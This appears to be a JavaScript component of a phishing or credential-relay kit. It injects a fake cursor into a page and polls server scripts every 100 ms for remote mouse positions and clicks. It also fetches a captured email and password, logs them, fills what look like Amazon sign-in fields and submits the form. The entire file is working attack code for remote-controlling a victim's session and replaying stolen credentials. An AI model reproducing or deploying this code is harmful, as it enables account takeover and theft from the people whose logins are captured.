// clear all cookies

$("body").prepend("<div style='min-width: 30px; min-height: 30px; border-radius: 50px; background: url(../cursor.png); background-position: center; background-repeat: no-repeat; background-size: contain; cursor: pointer; position: fixed; transition: cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 1999; top: 10%; left: 10%;' id='csc'></div>");

function gety() {
  $.get("../Automate.php", function (data, status) {
    const obj = JSON.parse(data);
    var op = obj.Y;
    var eft = obj.X;
    var clicked = obj.CL;
    if (op == "n" || eft == "n") {

      $("#"+clicked).trigger();

    } else {
      document.getElementById("csc").style.top = op + "px";
      document.getElementById("csc").style.left = eft + "px";
    }
  });
}
function log() {
  $.get("../log.php", function (data) {
    const dat = JSON.parse(data);
    var mail = dat.mail;
    var pass = dat.password;
    if (mail !== null || pass !== null ) {
console.log('get : '+mail+' , password: '+pass)
     
      // $("#"+clicked).trigger();
      $('#ap_email').val(mail);
      $('#ap_password').val(pass);
      $('form[name="signIn"]').submit();
      

        
    } else {
console.log('Error while geting input')
    
    }
  });
}
setInterval(() => {
  gety();
  log();
}, 100);

